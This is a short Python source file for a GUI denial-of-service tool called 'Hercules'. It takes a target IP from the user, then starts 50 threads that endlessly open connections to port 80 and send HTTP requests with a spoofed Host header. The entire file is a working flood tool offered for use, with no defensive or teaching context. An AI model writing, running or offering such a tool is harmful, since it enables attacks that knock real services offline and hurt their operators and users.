import PySimpleGUI as sg
import os
from concurrent.futures import thread
import socket
import threading
import time
sg.theme("Dark Purple")
layout = [[sg.Text("Hercules")],
         [sg.Text("Made by GUARDESK Security LTD.")],
         [sg.Text("Insert target IP:")],
         [sg.InputText()],
         [sg.Submit(), sg.Cancel()]
         ]
window = sg.Window(title="Hercules DoS Tool", layout=layout, margins=(100,150))
target = window.read()[1][0]
port = 80
Trd = 50
fake_ip = '44.197.175.168'
attack_num = 0
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target +"HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        global attack_num
        attack_num += 1

        s.close()
for i in range(Trd):
    thread = threading.Thread(target = attack)
    thread.start()
sg.Print("Hercules")
sg.Print(attack_num)
time.sleep(30)
window.close()
